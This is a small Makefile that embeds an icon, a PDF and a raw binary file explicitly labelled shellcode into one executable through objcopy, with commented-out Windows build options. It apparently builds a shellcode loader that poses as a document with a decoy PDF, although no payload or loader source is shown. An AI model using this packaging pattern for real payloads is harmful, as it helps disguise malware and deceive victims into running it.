CC = gcc
# RC = x86_64-w64-mingw32-windres
# CFLAGS = -mwindows
# LDFLAGS = -lshlwapi

all: main.out

main.out: main.o icon.o shellcode.o pdf.o
	$(CC) -o $@ $^ 

main.o: main.c
	$(CC) -c $< -o $@

icon.o:
	objcopy --input binary --output elf64-x86-64 --binary-architecture i386:x86-64 icon.ico icon.o
shellcode.o:
	objcopy --input binary --output elf64-x86-64 --binary-architecture i386:x86-64 1.bin shellcode.o
pdf.o:
	objcopy --input binary --output elf64-x86-64 --binary-architecture i386:x86-64 1.pdf pdf.o

clean:
	rm -f main.o icon.o shellcode.o pdf.o main.out




# main.out: main.o
# 	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

# main.o: main.c
# 	$(CC) $(CFLAGS) -c $< -o $@

# resources.o: resources.rc
# 	$(RC) -o $@ $<

# clean:
# 	rm -f main.o resources.o main.out
